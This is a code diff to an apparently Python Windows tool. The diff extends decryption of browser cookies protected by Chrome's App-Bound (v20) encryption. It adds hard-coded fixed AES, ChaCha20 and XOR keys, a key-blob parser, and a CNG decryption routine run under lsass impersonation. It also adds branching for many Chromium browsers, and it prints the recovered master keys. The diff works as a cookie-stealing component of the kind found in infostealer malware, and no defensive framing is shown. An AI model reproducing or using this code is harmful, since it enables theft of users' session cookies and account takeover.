@@ -18,7 +18,15 @@ from contextlib import contextmanager
 import windows
 import windows.crypto
 import windows.generated_def as gdef
-from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
+
+# Fixed keys for Chrome-style v20 key blob decryption
+CHROME_FIXED_AES_KEY = bytes.fromhex(
+    "B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
+CHROME_FIXED_CHACHA_KEY = bytes.fromhex(
+    "E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
+ABE_XOR_KEY = bytes.fromhex(
+    "CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
 
 # ---------------------------------------------------------------------------
 # Browser registry: (data_dir_relative, local_state_relative, key_name, process)
@@ -185,6 +193,72 @@ def copy_unlocked(src, dst):
         _rstrtmgr_copy(src, dst)
 
 
+def parse_key_blob(blob_data):
+    """Parse Chrome-style v20 key blob: header_len(4)+header+content_len(4)+flag(1)+data."""
+    import io
+    buf = io.BytesIO(blob_data)
+    d = {}
+    hl = struct.unpack('<I', buf.read(4))[0]; d['header'] = buf.read(hl)
+    cl = struct.unpack('<I', buf.read(4))[0]
+    d['flag'] = buf.read(1)[0]
+    if d['flag'] in (1, 2):
+        d['iv'] = buf.read(12); d['ciphertext'] = buf.read(32); d['tag'] = buf.read(16)
+    elif d['flag'] == 3:
+        d['encrypted_aes_key'] = buf.read(32); d['iv'] = buf.read(12)
+        d['ciphertext'] = buf.read(32); d['tag'] = buf.read(16)
+    else:
+        raise ValueError(f"Unsupported key blob flag: {d['flag']}")
+    return d
+
+
+def decrypt_with_cng(input_data, key_name):
+    """Decrypt data using NCrypt (CNG API) for Chrome flag=3 key blobs."""
+    ncrypt = ctypes.windll.NCrypt
+    hP = gdef.NCRYPT_PROV_HANDLE()
+    status = ncrypt.NCryptOpenStorageProvider(
+        ctypes.byref(hP), "Microsoft Software Key Storage Provider", 0)
+    if status != 0:
+        raise OSError(f"NCryptOpenStorageProvider failed: 0x{status & 0xFFFFFFFF:08X}")
+    hK = gdef.NCRYPT_KEY_HANDLE()
+    status = ncrypt.NCryptOpenKey(hP, ctypes.byref(hK), key_name, 0, 0)
+    if status != 0:
+        ncrypt.NCryptFreeObject(hP)
+        raise OSError(f"NCryptOpenKey failed: 0x{status & 0xFFFFFFFF:08X}")
+    pcb = gdef.DWORD(0)
+    ibuf = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)
+    status = ncrypt.NCryptDecrypt(hK, ibuf, len(ibuf), None, None, 0, ctypes.byref(pcb), 0x40)
+    if status != 0:
+        ncrypt.NCryptFreeObject(hK); ncrypt.NCryptFreeObject(hP)
+        raise OSError(f"NCryptDecrypt (size) failed: 0x{status & 0xFFFFFFFF:08X}")
+    obuf = (ctypes.c_ubyte * pcb.value)()
+    status = ncrypt.NCryptDecrypt(hK, ibuf, len(ibuf), None, obuf, pcb.value, ctypes.byref(pcb), 0x40)
+    if status != 0:
+        ncrypt.NCryptFreeObject(hK); ncrypt.NCryptFreeObject(hP)
+        raise OSError(f"NCryptDecrypt failed: 0x{status & 0xFFFFFFFF:08X}")
+    result = bytes(obuf[:pcb.value])
+    ncrypt.NCryptFreeObject(hK); ncrypt.NCryptFreeObject(hP)
+    return result
+
+
+def derive_chrome_v20_key(parsed, key_name):
+    """Derive AES-GCM master key from Chrome-style parsed v20 key blob.
+
+    flag=1: fixed AES key
+    flag=2: fixed ChaCha20 key
+    flag=3: CNG-encrypted AES key (needs lsass impersonation)
+    """
+    flag = parsed['flag']
+    if flag == 1:
+        cipher = AESGCM(CHROME_FIXED_AES_KEY)
+    elif flag == 2:
+        cipher = ChaCha20Poly1305(CHROME_FIXED_CHACHA_KEY)
+    elif flag == 3:
+        with impersonate_lsass():
+            dec_key = decrypt_with_cng(parsed['encrypted_aes_key'], key_name)
+        cipher = AESGCM(bytes(x ^ y for x, y in zip(dec_key, ABE_XOR_KEY)))
+    return cipher.decrypt(parsed['iv'], parsed['ciphertext'] + parsed['tag'], None)
+
+
 def decrypt_cookie_val(cipher, ev):
     """Decrypt a v20 cookie value. ev = b'v20' + iv(12) + ciphertext(N) + tag(16)."""
     iv, ct, tag = ev[3:15], ev[15:-16], ev[-16:]
@@ -322,16 +396,31 @@ def main():
         user_dec = windows.crypto.dpapi.unprotect(sys_dec)
         print(f"  user_dec length: {len(user_dec)} bytes")
 
-        # Step 3: Extract master key from user_dec
+        # Step 3: Extract v20 master key from user_dec
+        # Chrome uses parse_key_blob + derive_chrome_v20_key (flag-based structure)
+        # Edge uses extract_master_key (header_len + raw key structure)
         print("[3/4] Extracting v20 master key...")
+        v20_cipher = None
+        is_chrome_style = bname in ("chrome", "chromium", "ungoogled", "360", "360x",
+                                   "qq", "sogou", "liebao", "2345", "maxthon", "slimjet",
+                                   "coccoc", "arc", "yandex", "brave")
         try:
-            master_key, header_len, content_len = extract_master_key(user_dec)
-            print(f"  header_len: {header_len}, content_len: {content_len}")
-            print(f"  Master key: {master_key.hex()}")
-            v20_cipher = AESGCM(master_key)
+            if is_chrome_style:
+                # Chrome-style: header_len(4)+header+content_len(4)+flag(1)+data
+                parsed = parse_key_blob(user_dec)
+                flag = parsed['flag']
+                print(f"  flag={flag}")
+                master_key = derive_chrome_v20_key(parsed, cng_key_name)
+                print(f"  Master key: {master_key.hex()}")
+                v20_cipher = AESGCM(master_key)
+            else:
+                # Edge-style: header_len(4)+header+content_len(4)+raw_master_key
+                master_key, header_len, content_len = extract_master_key(user_dec)
+                print(f"  header_len: {header_len}, content_len: {content_len}")
+                print(f"  Master key: {master_key.hex()}")
+                v20_cipher = AESGCM(master_key)
         except Exception as e:
             print(f"  v20 key extraction failed: {e}")
-            v20_cipher = None
     else:
         print("[SKIP] No app_bound_encrypted_key (ABE/v20 not supported by this browser)")
         v20_cipher = None
